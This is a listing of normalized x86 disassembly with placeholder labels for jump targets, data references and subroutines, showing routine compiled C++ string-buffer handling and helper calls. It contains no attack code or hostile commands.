mov ecx [ ebp - 0x240 ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x240 ] 0x3
jne r-xdata
mov eax [ ebp - 0x568 ]
mov eax [ ebp - 0x568 ]
or eax 0x4
jmp r-xdata
mov edx [ ebp - 0x4a8 ]
mov [ ebp - 0x4b0 ] edx
mov ecx [ ebp - 0x4a8 ]
mov eax [ ebp - 0x4a8 ]
mov [ ebp - 0x564 ] eax
mov [ rw-data ] ecx
mov edx [ ebp - 0x564 ]
add edx 0x4
push edx
call sub_4c3b78
pop ecx
mov ecx [ ebp - 0x564 ]
push ecx
call sub_4ba37c
pop ecx
push ebx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
lea edx [ ebp - 0x190 ]
push edx
call sub_4088ac
pop ecx
lea eax [ ebp - 0x190 ]
inc [ ebx + 0x1c ]
mov ecx rw-data
mov [ ebp - 0x190 ] ecx
inc [ ebx + 0x1c ]
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
push 0x20
call sub_4bbbac
pop ecx
mov [ ebp - 0x198 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x264
push ecx
push esi
call sub_4b02b0
add esp 0xc
mov ecx [ ebp - 0xec ]
mov [ ebx + 0x10 ] 0x210
mov edx [ ebp - 0x3cc ]
mov ecx [ edx + 0x8 ]
add ecx 0x18
mov [ ebp - 0x3e0 ] ecx
mov eax [ ebp - 0x3e0 ]
add eax 0x8
push eax
lea edx [ ebp - 0x3e8 ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x3e8 ]
push ecx
lea eax [ ebp - 0x10c ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0xf0 ] edx
mov [ ebp - 0x3e9 ] 0x0
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
mov ecx 0xf
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3b1 ] 0x0
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
mov edx [ ebp - 0x58 ]
mov [ ebp - 0x3ac ] edx
mov eax [ ebp - 0x3ac ]
mov [ ebp - 0x3b0 ] eax
mov edx [ ebp - 0x3b0 ]
push edx
call sub_4b0180
pop ecx
lea ecx [ ebp - 0x58 ]
mov ecx [ ebp - 0x58 ]
jmp r-xdata
mov eax [ ebp - 0x64c ]
mov eax [ ebp - 0x64c ]
or eax 0x4
jmp r-xdata
mov edx [ ebp - 0x58c ]
mov [ ebp - 0x594 ] edx
mov ecx [ ebp - 0x58c ]
mov eax [ ebp - 0x58c ]
mov [ ebp - 0x648 ] eax
mov [ rw-data ] ecx
mov edx [ ebp - 0x648 ]
add edx 0x4
push edx
call sub_4c3b78
pop ecx
mov ecx [ ebp - 0x648 ]
push ecx
call sub_4ba37c
pop ecx
push ebx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
lea edx [ ebp - 0x23c ]
push edx
call sub_4088ac
pop ecx
lea eax [ ebp - 0x23c ]
inc [ ebx + 0x1c ]
mov ecx rw-data
mov [ ebp - 0x23c ] ecx
inc [ ebx + 0x1c ]
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
push 0x20
call sub_4bbbac
pop ecx
mov [ ebp - 0x244 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x2f4
push eax
mov edx [ ebp - 0x49c ]
push edx
call sub_4b02b0
add esp 0xc
mov ecx [ ebp - 0x198 ]
mov [ ebx + 0x10 ] 0x2a0
mov edx [ ebp - 0x4a4 ]
mov ecx [ edx + 0x8 ]
add ecx 0x18
mov [ ebp - 0x4b8 ] ecx
mov eax [ ebp - 0x4b8 ]
add eax 0x8
push eax
lea edx [ ebp - 0x4c0 ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x4c0 ]
push ecx
lea eax [ ebp - 0x1b8 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x19c ] edx
mov [ ebp - 0x4c1 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov ecx 0xf
mov [ ebp - 0xf0 ] ecx
mov [ ebp - 0x47d ] 0x0
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
mov edx [ ebp - 0x104 ]
mov [ ebp - 0x478 ] edx
mov eax [ ebp - 0x478 ]
mov [ ebp - 0x47c ] eax
mov edx [ ebp - 0x47c ]
push edx
call sub_4b0180
pop ecx
lea ecx [ ebp - 0x104 ]
mov ecx [ ebp - 0x104 ]
jmp r-xdata
lea eax [ ebp - 0x58 ]
mov eax [ ebp - 0x58 ]
jmp r-xdata
mov ecx [ ebp - 0x314 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x328 ] eax
cmp [ ebp - 0x328 ] 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x68 ]
push edx
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0x48 ] eax
add ecx eax
mov [ ebp - 0x324 ] ecx
mov edx [ ebp - 0x324 ]
mov cl [ ebp - 0x31d ]
mov [ edx ] cl
mov eax [ ebp - 0x314 ]
cmp [ eax + 0x20 ] 0x0
jae r-xdata
push eax
mov edx [ ebp - 0x580 ]
push edx
call sub_4b02b0
add esp 0xc
mov ecx [ ebp - 0x244 ]
mov [ ebx + 0x10 ] 0x330
mov edx [ ebp - 0x588 ]
mov ecx [ edx + 0x8 ]
add ecx 0x18
mov [ ebp - 0x59c ] ecx
mov eax [ ebp - 0x59c ]
add eax 0x8
push eax
lea edx [ ebp - 0x5a4 ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x5a4 ]
push ecx
lea eax [ ebp - 0x264 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x248 ] edx
mov [ ebp - 0x5a5 ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov ecx 0xf
mov [ ebp - 0x19c ] ecx
mov [ ebp - 0x559 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov edx [ ebp - 0x1b0 ]
mov [ ebp - 0x554 ] edx
mov eax [ ebp - 0x554 ]
mov [ ebp - 0x558 ] eax
mov edx [ ebp - 0x558 ]
push edx
call sub_4b0180
pop ecx
lea ecx [ ebp - 0x1b0 ]
mov ecx [ ebp - 0x1b0 ]
jmp r-xdata
lea eax [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
jmp r-xdata
mov ecx [ ebp - 0x3e0 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x3f4 ] eax
cmp [ ebp - 0x3f4 ] 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x114 ]
push edx
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0xf4 ] eax
add ecx eax
mov [ ebp - 0x3f0 ] ecx
mov edx [ ebp - 0x3f0 ]
mov cl [ ebp - 0x3e9 ]
mov [ edx ] cl
mov eax [ ebp - 0x3e0 ]
cmp [ eax + 0x20 ] 0x0
jae r-xdata
xor edx edx
mov [ ebp - 0x48 ] edx
add eax edx
mov [ ebp - 0x3b8 ] eax
mov eax [ ebp - 0x3b8 ]
mov cl [ ebp - 0x3b1 ]
mov [ eax ] cl
mov [ ebx + 0x10 ] 0x144
lea edx [ ebp - 0x68 ]
cmp edx [ ebp - 0x314 ]
jne r-xdata
mov [ ebp - 0x328 ] 0xffffffff
mov ecx 0xf
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x63d ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov edx [ ebp - 0x25c ]
mov [ ebp - 0x638 ] edx
mov eax [ ebp - 0x638 ]
mov [ ebp - 0x63c ] eax
mov edx [ ebp - 0x63c ]
push edx
call sub_4b0180
pop ecx
lea ecx [ ebp - 0x25c ]
mov ecx [ ebp - 0x25c ]
jmp r-xdata
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
mov ecx [ ebp - 0x4b8 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x4cc ] eax
cmp [ ebp - 0x4cc ] 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x1c0 ]
push edx
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0x1a0 ] eax
add ecx eax
mov [ ebp - 0x4c8 ] ecx
mov edx [ ebp - 0x4c8 ]
mov cl [ ebp - 0x4c1 ]
mov [ edx ] cl
mov eax [ ebp - 0x4b8 ]
cmp [ eax + 0x20 ] 0x0
jae r-xdata
xor edx edx
mov [ ebp - 0xf4 ] edx
add eax edx
mov [ ebp - 0x484 ] eax
mov eax [ ebp - 0x484 ]
mov cl [ ebp - 0x47d ]
mov [ eax ] cl
mov [ ebx + 0x10 ] 0x1d4
lea edx [ ebp - 0x114 ]
cmp edx [ ebp - 0x3e0 ]
jne r-xdata
mov [ ebp - 0x3f4 ] 0xffffffff
mov edi [ ebp - 0x328 ]
lea eax [ ebp - 0x60 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x370 ] eax
cmp [ ebp - 0x370 ] 0x1
ja r-xdata
mov [ ebp - 0x32c ] 0xffffffff
mov ecx [ ebp - 0x328 ]
mov [ ebp - 0x330 ] ecx
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x330 ]
jae r-xdata
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
mov ecx [ ebp - 0x59c ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x5b0 ] eax
cmp [ ebp - 0x5b0 ] 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x26c ]
push edx
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0x24c ] eax
add ecx eax
mov [ ebp - 0x5ac ] ecx
mov edx [ ebp - 0x5ac ]
mov cl [ ebp - 0x5a5 ]
mov [ edx ] cl
mov eax [ ebp - 0x59c ]
cmp [ eax + 0x20 ] 0x0
jae r-xdata
xor edx edx
mov [ ebp - 0x1a0 ] edx
add eax edx
mov [ ebp - 0x560 ] eax
mov eax [ ebp - 0x560 ]
mov cl [ ebp - 0x559 ]
mov [ eax ] cl
mov [ ebx + 0x10 ] 0x264
lea edx [ ebp - 0x1c0 ]
cmp edx [ ebp - 0x4b8 ]
jne r-xdata
mov [ ebp - 0x4cc ] 0xffffffff
mov edi [ ebp - 0x3f4 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x43c ] eax
cmp [ ebp - 0x43c ] 0x1
ja r-xdata
mov [ ebp - 0x3f8 ] 0xffffffff
mov ecx [ ebp - 0x3f4 ]
mov [ ebp - 0x3fc ] ecx
mov eax [ ebp - 0xf4 ]
cmp eax [ ebp - 0x3fc ]
jae r-xdata
mov edx [ ebp - 0x370 ]
dec edx
mov edx 0x1
jmp r-xdata
mov ecx [ ebp - 0x48 ]
sub ecx [ ebp - 0x330 ]
cmp ecx [ ebp - 0x32c ]
jae r-xdata
lea edx [ ebp - 0x68 ]
push edx
call sub_4bc8cc
pop ecx
xor edx edx
mov [ ebp - 0x24c ] edx
add eax edx
mov [ ebp - 0x644 ] eax
mov eax [ ebp - 0x644 ]
mov cl [ ebp - 0x63d ]
mov [ eax ] cl
mov [ ebx + 0x10 ] 0x2f4
lea edx [ ebp - 0x26c ]
cmp edx [ ebp - 0x59c ]
jne r-xdata
mov [ ebp - 0x5b0 ] 0xffffffff
mov eax [ ebp - 0x4cc ]
mov [ ebp - 0x514 ] eax
lea edx [ ebp - 0x1b8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x518 ] eax
cmp [ ebp - 0x518 ] 0x1
ja r-xdata
mov [ ebp - 0x4d0 ] 0xffffffff
mov ecx [ ebp - 0x4cc ]
mov [ ebp - 0x4d4 ] ecx
mov eax [ ebp - 0x1a0 ]
cmp eax [ ebp - 0x4d4 ]
jae r-xdata
mov edx [ ebp - 0x43c ]
dec edx
mov edx 0x1
jmp r-xdata
mov ecx [ ebp - 0xf4 ]
sub ecx [ ebp - 0x3fc ]
cmp ecx [ ebp - 0x3f8 ]
jae r-xdata
lea edx [ ebp - 0x114 ]
push edx
call sub_4bc8cc
pop ecx
cmp edi [ ebp - 0x44 ]
jbe r-xdata
lea eax [ ebp - 0x68 ]
push eax
call sub_4bbca8
pop ecx
cmp edi edx
jbe r-xdata
cmp [ ebp - 0x32c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x330 ]
mov [ ebp - 0x32c ] eax
mov eax [ ebp - 0x5b0 ]
mov [ ebp - 0x5f8 ] eax
lea edx [ ebp - 0x264 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x5fc ] eax
cmp [ ebp - 0x5fc ] 0x1
ja r-xdata
mov [ ebp - 0x5b4 ] 0xffffffff
mov ecx [ ebp - 0x5b0 ]
mov [ ebp - 0x5b8 ] ecx
mov eax [ ebp - 0x24c ]
cmp eax [ ebp - 0x5b8 ]
jae r-xdata
mov ecx [ ebp - 0x518 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebp - 0x1a0 ]
sub ecx [ ebp - 0x4d4 ]
cmp ecx [ ebp - 0x4d0 ]
jae r-xdata
lea edx [ ebp - 0x1c0 ]
push edx
call sub_4bc8cc
pop ecx
cmp edi [ ebp - 0xf0 ]
jbe r-xdata
lea eax [ ebp - 0x114 ]
push eax
call sub_4bbca8
pop ecx
cmp edi edx
jbe r-xdata
cmp [ ebp - 0x3f8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0xf4 ]
sub eax [ ebp - 0x3fc ]
mov [ ebp - 0x3f8 ] eax
test edi edi
jne r-xdata
mov ecx [ ebp - 0x48 ]
lea eax [ ebp - 0x68 ]
push ecx
push edi
push eax
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x350 ] eax
cmp [ ebp - 0x48 ] 0x0
jae r-xdata
mov edx [ ebp - 0x48 ]
sub edx [ ebp - 0x330 ]
sub edx [ ebp - 0x32c ]
mov [ ebp - 0x334 ] edx
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x5fc ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebp - 0x24c ]
sub ecx [ ebp - 0x5b8 ]
cmp ecx [ ebp - 0x5b4 ]
jae r-xdata
lea edx [ ebp - 0x26c ]
push edx
call sub_4bc8cc
pop ecx
mov edx [ ebp - 0x19c ]
cmp edx [ ebp - 0x514 ]
jae r-xdata
lea eax [ ebp - 0x1c0 ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x514 ]
jae r-xdata
cmp [ ebp - 0x4d0 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x1a0 ]
sub eax [ ebp - 0x4d4 ]
mov [ ebp - 0x4d0 ] eax
test edi edi
jne r-xdata
mov ecx [ ebp - 0xf4 ]
lea eax [ ebp - 0x114 ]
push ecx
push edi
push eax
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x41c ] eax
cmp [ ebp - 0xf4 ] 0x0
jae r-xdata
mov edx [ ebp - 0xf4 ]
sub edx [ ebp - 0x3fc ]
sub edx [ ebp - 0x3f8 ]
mov [ ebp - 0x400 ] edx
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x389 ] 0x0
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x48 ]
cmp ecx [ ebp - 0x350 ]
jae r-xdata
lea edx [ ebp - 0x68 ]
push edx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x58 ]
mov ecx [ ebp - 0x58 ]
jmp r-xdata
mov edx [ ebp - 0x248 ]
cmp edx [ ebp - 0x5f8 ]
jae r-xdata
lea eax [ ebp - 0x26c ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x5f8 ]
jae r-xdata
cmp [ ebp - 0x5b4 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x24c ]
sub eax [ ebp - 0x5b8 ]
mov [ ebp - 0x5b4 ] eax
cmp [ ebp - 0x514 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1a0 ]
push eax
mov edx [ ebp - 0x514 ]
push edx
lea ecx [ ebp - 0x1c0 ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x4f4 ] eax
cmp [ ebp - 0x1a0 ] 0x0
jae r-xdata
mov edx [ ebp - 0x1a0 ]
sub edx [ ebp - 0x4d4 ]
sub edx [ ebp - 0x4d0 ]
mov [ ebp - 0x4d8 ] edx
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x455 ] 0x0
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xf4 ]
cmp ecx [ ebp - 0x41c ]
jae r-xdata
lea edx [ ebp - 0x114 ]
push edx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x104 ]
mov ecx [ ebp - 0x104 ]
jmp r-xdata
inc [ ebx + 0x1c ]
lea eax [ ebp - 0x68 ]
push eax
inc [ ebx + 0x1c ]
lea edx [ ebp - 0xc8 ]
push edx
call sub_4bab6c
add [ ebx + 0x1c ] 0x4
mov [ ebp - 0x310 ] eax
mov ecx rw-data
mov eax [ ebp - 0x40 ]
add esp 0x8
mov [ eax ] ecx
xor ecx ecx
mov edx [ ebp - 0x40 ]
mov eax rw-data
mov [ edx + 0x4 ] ecx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x40 ]
mov [ edx ] eax
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov edx [ ebp - 0x310 ]
push edx
mov ecx [ ebp - 0x40 ]
add ecx 0x8
push ecx
call sub_4b65f4
add esp 0x8
mov eax [ ebp - 0x310 ]
push eax
mov edx [ ebp - 0x40 ]
add edx 0x18
push edx
call sub_4b9748
add esp 0x8
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x168
mov ecx [ ebp - 0x40 ]
jmp r-xdata
mov edx [ ebp - 0x328 ]
mov [ ebp - 0x394 ] edx
mov ecx [ ebp - 0x314 ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x58 ]
mov eax [ ebp - 0x58 ]
jmp r-xdata
cmp [ ebp - 0x350 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x350 ] eax
lea eax [ ebp - 0x58 ]
mov eax [ ebp - 0x58 ]
jmp r-xdata
add ecx [ ebp - 0x330 ]
add ecx [ ebp - 0x32c ]
mov [ ebp - 0x338 ] ecx
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
cmp [ ebp - 0x5f8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x24c ]
push eax
mov edx [ ebp - 0x5f8 ]
push edx
lea ecx [ ebp - 0x26c ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x5d8 ] eax
cmp [ ebp - 0x24c ] 0x0
jae r-xdata
mov edx [ ebp - 0x24c ]
sub edx [ ebp - 0x5b8 ]
sub edx [ ebp - 0x5b4 ]
mov [ ebp - 0x5bc ] edx
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
cmp [ ebp - 0x514 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x531 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov ecx [ ebp - 0x1a0 ]
cmp ecx [ ebp - 0x4f4 ]
jae r-xdata
lea edx [ ebp - 0x1c0 ]
push edx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x1b0 ]
mov ecx [ ebp - 0x1b0 ]
jmp r-xdata
inc [ ebx + 0x1c ]
lea eax [ ebp - 0x114 ]
push eax
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x174 ]
push edx
call sub_4bab6c
add [ ebx + 0x1c ] 0x4
mov [ ebp - 0x3dc ] eax
mov ecx rw-data
mov eax [ ebp - 0xec ]
add esp 0x8
mov [ eax ] ecx
xor ecx ecx
mov edx [ ebp - 0xec ]
mov eax rw-data
mov [ edx + 0x4 ] ecx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0xec ]
mov [ edx ] eax
inc [ ebx + 0x1c ]
mov eax [ ebp - 0xec ]
mov [ eax ] ecx
mov edx [ ebp - 0x3dc ]
push edx
mov ecx [ ebp - 0xec ]
add ecx 0x8
push ecx
call sub_4b65f4
add esp 0x8
mov eax [ ebp - 0x3dc ]
push eax
mov edx [ ebp - 0xec ]
add edx 0x18
push edx
call sub_4b9748
add esp 0x8
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x1f8
mov ecx [ ebp - 0xec ]
jmp r-xdata
mov edx [ ebp - 0x3f4 ]
mov [ ebp - 0x460 ] edx
mov ecx [ ebp - 0x3e0 ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
jmp r-xdata
cmp [ ebp - 0x41c ] 0x0
jbe r-xdata
mov eax [ ebp - 0xf4 ]
mov [ ebp - 0x41c ] eax
lea eax [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
jmp r-xdata
add ecx [ ebp - 0x3fc ]
add ecx [ ebp - 0x3f8 ]
mov [ ebp - 0x404 ] ecx
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
mov [ ebp - 0x304 ] ecx
sub [ ebx + 0x1c ] 0x4
push 0x2
lea eax [ ebp - 0xc8 ]
push eax
call sub_4bb8e4
add esp 0x8
dec [ ebx + 0x1c ]
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
mov edx [ ebp - 0x314 ]
add edx 0x10
mov eax [ ebp - 0x314 ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0x48 ] edx
add eax edx
mov [ ebp - 0x390 ] eax
mov eax [ ebp - 0x390 ]
mov cl [ ebp - 0x389 ]
mov [ eax ] cl
mov edx [ ebp - 0x48 ]
sub edx [ ebp - 0x350 ]
mov [ ebp - 0x354 ] edx
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
lea eax [ ebp - 0x58 ]
mov eax [ ebp - 0x58 ]
jmp r-xdata
add eax [ ebp - 0x330 ]
mov [ ebp - 0x33c ] eax
mov edx [ ebp - 0x334 ]
push edx
mov ecx [ ebp - 0x338 ]
push ecx
mov eax [ ebp - 0x33c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x48 ]
sub edx [ ebp - 0x32c ]
mov [ ebp - 0x340 ] edx
mov ecx [ ebp - 0x340 ]
mov [ ebp - 0x344 ] ecx
mov [ ebp - 0x345 ] 0x0
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
cmp [ ebp - 0x5f8 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x615 ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x24c ]
cmp ecx [ ebp - 0x5d8 ]
jae r-xdata
lea edx [ ebp - 0x26c ]
push edx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x25c ]
mov ecx [ ebp - 0x25c ]
jmp r-xdata
inc [ ebx + 0x1c ]
lea eax [ ebp - 0x1c0 ]
push eax
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x220 ]
push edx
call sub_4bab6c
add [ ebx + 0x1c ] 0x4
mov [ ebp - 0x4b4 ] eax
mov ecx rw-data
mov eax [ ebp - 0x198 ]
add esp 0x8
mov [ eax ] ecx
xor ecx ecx
mov edx [ ebp - 0x198 ]
mov eax rw-data
mov [ edx + 0x4 ] ecx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x198 ]
mov [ edx ] eax
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x198 ]
mov [ eax ] ecx
mov edx [ ebp - 0x4b4 ]
push edx
mov ecx [ ebp - 0x198 ]
add ecx 0x8
push ecx
call sub_4b65f4
add esp 0x8
mov eax [ ebp - 0x4b4 ]
push eax
mov edx [ ebp - 0x198 ]
add edx 0x18
push edx
call sub_4b9748
add esp 0x8
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x288
mov ecx [ ebp - 0x198 ]
jmp r-xdata
mov edx [ ebp - 0x4cc ]
mov [ ebp - 0x53c ] edx
mov ecx [ ebp - 0x4b8 ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
cmp [ ebp - 0x4f4 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x1a0 ]
mov [ ebp - 0x4f4 ] eax
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
add ecx [ ebp - 0x4d4 ]
add ecx [ ebp - 0x4d0 ]
mov [ ebp - 0x4dc ] ecx
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov [ ebp - 0x3d0 ] ecx
sub [ ebx + 0x1c ] 0x4
push 0x2
lea eax [ ebp - 0x174 ]
push eax
call sub_4bb8e4
add esp 0x8
dec [ ebx + 0x1c ]
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
mov edx [ ebp - 0x3e0 ]
add edx 0x10
mov eax [ ebp - 0x3e0 ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0xf4 ] edx
add eax edx
mov [ ebp - 0x45c ] eax
mov eax [ ebp - 0x45c ]
mov cl [ ebp - 0x455 ]
mov [ eax ] cl
mov edx [ ebp - 0xf4 ]
sub edx [ ebp - 0x41c ]
mov [ ebp - 0x420 ] edx
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
lea eax [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
jmp r-xdata
add eax [ ebp - 0x3fc ]
mov [ ebp - 0x408 ] eax
mov edx [ ebp - 0x400 ]
push edx
mov ecx [ ebp - 0x404 ]
push ecx
mov eax [ ebp - 0x408 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0xf4 ]
sub edx [ ebp - 0x3f8 ]
mov [ ebp - 0x40c ] edx
mov ecx [ ebp - 0x40c ]
mov [ ebp - 0x410 ] ecx
mov [ ebp - 0x411 ] 0x0
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
lea eax [ ebp - 0x58 ]
mov eax [ ebp - 0x58 ]
jmp r-xdata
mov [ ebp - 0x398 ] edx
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
lea ecx [ ebp - 0x58 ]
mov ecx [ ebp - 0x58 ]
jmp r-xdata
mov edx [ ebp - 0x344 ]
mov [ ebp - 0x48 ] edx
add eax edx
mov [ ebp - 0x34c ] eax
mov eax [ ebp - 0x34c ]
mov cl [ ebp - 0x345 ]
mov [ eax ] cl
inc [ ebx + 0x1c ]
lea eax [ ebp - 0x26c ]
push eax
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x2cc ]
push edx
call sub_4bab6c
add [ ebx + 0x1c ] 0x4
mov [ ebp - 0x598 ] eax
mov ecx rw-data
mov eax [ ebp - 0x244 ]
add esp 0x8
mov [ eax ] ecx
xor ecx ecx
mov edx [ ebp - 0x244 ]
mov eax rw-data
mov [ edx + 0x4 ] ecx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x244 ]
mov [ edx ] eax
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x244 ]
mov [ eax ] ecx
mov edx [ ebp - 0x598 ]
push edx
mov ecx [ ebp - 0x244 ]
add ecx 0x8
push ecx
call sub_4b65f4
add esp 0x8
mov eax [ ebp - 0x598 ]
push eax
mov edx [ ebp - 0x244 ]
add edx 0x18
push edx
call sub_4b9748
add esp 0x8
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x318
mov ecx [ ebp - 0x244 ]
jmp r-xdata
mov edx [ ebp - 0x5b0 ]
mov [ ebp - 0x620 ] edx
mov ecx [ ebp - 0x59c ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
cmp [ ebp - 0x5d8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x24c ]
mov [ ebp - 0x5d8 ] eax
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
add ecx [ ebp - 0x5b8 ]
add ecx [ ebp - 0x5b4 ]
mov [ ebp - 0x5c0 ] ecx
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov [ ebp - 0x4a8 ] ecx
sub [ ebx + 0x1c ] 0x4
push 0x2
lea eax [ ebp - 0x220 ]
push eax
call sub_4bb8e4
add esp 0x8
dec [ ebx + 0x1c ]
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov edx [ ebp - 0x4b8 ]
add edx 0x10
mov eax [ ebp - 0x4b8 ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0x1a0 ] edx
add eax edx
mov [ ebp - 0x538 ] eax
mov eax [ ebp - 0x538 ]
mov cl [ ebp - 0x531 ]
mov [ eax ] cl
mov edx [ ebp - 0x1a0 ]
sub edx [ ebp - 0x4f4 ]
mov [ ebp - 0x4f8 ] edx
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
